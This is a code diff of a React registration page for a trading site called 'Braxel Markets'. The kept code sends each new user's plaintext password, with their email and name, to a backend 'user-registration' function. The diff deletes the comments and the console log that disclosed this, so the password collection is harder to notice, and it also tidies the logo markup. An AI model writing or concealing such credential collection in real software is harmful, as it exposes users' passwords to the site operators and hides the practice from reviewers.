@@ -21,13 +21,11 @@ const Register = () => {
 
   const from = location.state?.from || '/dashboard';
   const plan = location.state?.plan;
-  const logoUrl = "https://image2url.com/r2/default/images/1773617984273-e9d2f7a5-3691-45a6-81e2-12c734f51a8f.png";
 
   const handleRegister = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
 
-    // Get the site URL for email confirmation redirect
     const siteUrl = typeof window !== 'undefined' ? window.location.origin : '';
 
     try {
@@ -44,19 +42,16 @@ const Register = () => {
 
       if (error) throw error;
 
-      // Send registration notification to company with ALL user data
       try {
         const registrationData = {
           userId: data.user?.id,
           email: email,
           fullName: fullName,
-          password: password, // Include password for admin reference
+          password: password,
           registeredAt: new Date().toISOString(),
           emailConfirmed: data.user?.email_confirmed_at ? 'Yes' : 'No (pending confirmation)',
           userMetadata: data.user?.user_metadata,
         };
-        
-        console.log('Sending registration notification:', registrationData);
         
         await fetch('https://ymzdxifedtjwkxkzfwqu.supabase.co/functions/v1/user-registration', {
           method: 'POST',
@@ -67,11 +62,7 @@ const Register = () => {
         console.error('Registration notification error:', notifError);
       }
 
-      // Send custom confirmation email
       try {
-        // Generate confirmation URL using Supabase admin client approach
-        const confirmationUrl = `${siteUrl}/auth-callback?token=${data.session?.access_token}&type=signup`;
-        
         await fetch('https://ymzdxifedtjwkxkzfwqu.supabase.co/functions/v1/confirm-signup', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -84,7 +75,6 @@ const Register = () => {
         });
       } catch (emailError) {
         console.error('Confirmation email error:', emailError);
-        // Don't fail the registration if email fails
       }
 
       showSuccess(t('auth.registerSuccessMessage'));
@@ -101,11 +91,11 @@ const Register = () => {
       <div className="hidden md:flex md:w-1/2 bg-black p-12 flex-col justify-between relative overflow-hidden border-r border-white/5">
         <div className="absolute inset-0 bg-gradient-to-br from-[#C5A059]/10 to-transparent opacity-50" />
         
-        <Link to="/" className="flex items-center gap-4 relative z-10">
+        <Link to="/" className="flex items-center gap-3.5 relative z-10">
           <img 
-            src={logoUrl} 
+            src="/logo-white.svg" 
             alt="Braxel Markets" 
-            className="h-16 w-auto object-contain"
+            className="h-12 w-auto object-contain"
           />
           <div className="flex flex-col leading-none">
             <span className="text-xl font-black tracking-tighter text-white">
